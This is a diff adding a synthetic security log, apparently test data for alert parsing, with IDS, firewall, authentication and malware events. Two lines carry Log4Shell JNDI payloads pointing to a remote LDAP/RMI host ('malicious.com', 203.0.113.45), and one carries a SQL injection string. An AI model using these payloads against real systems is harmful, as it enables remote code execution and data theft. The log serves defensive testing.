@@ -1,0 +1,25 @@
+2026-03-15T08:00:01.123Z alert ids=1001 signature="ET MALWARE CobaltStrike Beacon" src=203.0.113.45 dst=10.0.0.5 proto=tcp sport=443 dport=54321 severity=CRITICAL action=allowed
+2026-03-15T08:00:05.456Z warning ids=1002 signature="ET SCAN Nmap Scanning Detected" src=192.168.1.100 dst=10.0.0.0/24 proto=tcp sport=54000 dport=22 severity=WARNING action=blocked
+2026-03-15T08:01:00.789Z critical firewall rule_id=DROP_ALL src=198.51.100.22 dst=10.0.0.8 proto=tcp sport=43210 dport=3389 msg="RDP brute force attempt blocked" severity=CRITICAL
+2026-03-15T08:01:05.000Z critical firewall rule_id=DROP_ALL src=198.51.100.22 dst=10.0.0.8 proto=tcp sport=43211 dport=3389 msg="RDP brute force attempt blocked" severity=CRITICAL
+2026-03-15T08:01:10.000Z critical firewall rule_id=DROP_ALL src=198.51.100.22 dst=10.0.0.8 proto=tcp sport=43212 dport=3389 msg="RDP brute force attempt blocked" severity=CRITICAL
+2026-03-15T08:02:00.100Z error application nginx worker failed to connect upstream 10.0.0.9:8080 timeout=30s retries=3
+2026-03-15T08:02:30.200Z warning application ssl certificate expiring in 7 days domain=internal.corp.local severity=WARNING
+2026-03-15T08:03:00.300Z critical exploit CVE-2021-44228 Log4Shell attempt detected src=203.0.113.45 payload="${jndi:ldap://203.0.113.45:1389/exploit}" severity=CRITICAL action=blocked
+2026-03-15T08:03:05.400Z critical exploit CVE-2021-44228 Log4Shell attempt detected src=203.0.113.45 payload="${jndi:rmi://malicious.com/payload}" severity=CRITICAL action=blocked
+2026-03-15T08:04:00.500Z info auth user=alice src=192.168.1.10 action=login status=success method=mfa
+2026-03-15T08:04:30.600Z warning auth user=bob src=203.0.113.45 action=login status=fail reason=wrong_password attempts=4
+2026-03-15T08:04:35.700Z warning auth user=bob src=203.0.113.45 action=login status=fail reason=wrong_password attempts=5
+2026-03-15T08:04:40.800Z warning auth user=bob src=203.0.113.45 action=login status=fail reason=wrong_password attempts=6
+2026-03-15T08:05:00.900Z critical malware ransomware detected host=WORKSTATION-07 file=C:\Users\Public\encrypt.exe hash=aabbccdd11223344
+2026-03-15T08:05:10.000Z critical malware attack rootkit behavior detected pid=4444 process=svchost.exe parent=cmd.exe severity=CRITICAL
+2026-03-15T08:06:00.100Z warning network dns unusual query count src=10.0.0.12 queries=145 window=60s severity=WARNING
+2026-03-15T08:06:30.200Z info backup completed successfully target=\\backup-server\share size=15GB duration=3m20s
+2026-03-15T08:07:00.300Z error database connection refused host=db-primary:5432 retries=5 severity=WARNING
+2026-03-15T08:08:00.400Z critical network data exfiltration suspected src=10.0.0.5 dst=203.0.113.45 bytes=52428800 proto=https severity=CRITICAL
+2026-03-15T08:09:00.500Z info system scheduled task completed task=antivirus_scan result=clean files_scanned=142853
+2026-03-15T08:10:00.600Z warning auth user=admin src=198.51.100.99 action=login status=fail reason=account_locked
+2026-03-15T08:11:00.700Z critical exploit SQL injection attempt detected url=/api/users?id=1+OR+1=1 src=203.0.113.45 severity=CRITICAL
+2026-03-15T08:12:00.800Z warning network port scan detected src=192.168.2.50 ports_scanned=89 duration=30s severity=WARNING
+2026-03-15T08:13:00.900Z info auth user=deploy src=172.16.0.5 action=login status=success method=api_key
+2026-03-15T08:14:00.000Z critical malware C2 beacon detected src=10.0.0.7 dst=203.0.113.45 interval=60s protocol=https severity=CRITICAL
